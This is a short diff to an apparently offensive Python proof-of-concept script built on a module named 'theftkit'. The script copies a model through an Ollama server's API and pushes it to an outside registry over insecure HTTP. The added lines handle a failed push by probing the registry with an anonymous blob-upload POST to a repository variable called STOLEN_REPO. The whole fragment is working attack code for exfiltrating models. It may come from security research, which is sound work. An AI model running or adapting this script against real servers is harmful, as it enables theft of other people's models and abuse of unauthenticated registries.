@@ -16,6 +16,14 @@ print(f"[ok] POST /api/copy HTTP {copy_status} -> {theftkit.PUSH_NAME}")
 seconds, last, err = theftkit.push_model(theftkit.PUSH_NAME)
 if err:
     print(f"[!!] push failed after {seconds:.1f}s: {err}")
+    # Ollama's error does not name the status code, so ask the registry directly:
+    # an anonymous blob upload is the first write of any push.
+    upload = f"/v2/{theftkit.STOLEN_REPO}/blobs/uploads/"
+    try:
+        up_status, _ = theftkit.request("POST", theftkit.REGISTRY + upload, timeout=20)
+    except theftkit.HttpStatus as e:
+        up_status = e.status
+    print(f"[ok] anonymous POST {upload} HTTP {up_status}")
     raise SystemExit(1)
 print(f"[ok] POST /api/push insecure HTTP success in {seconds:.1f}s (last status {last!r})")
 
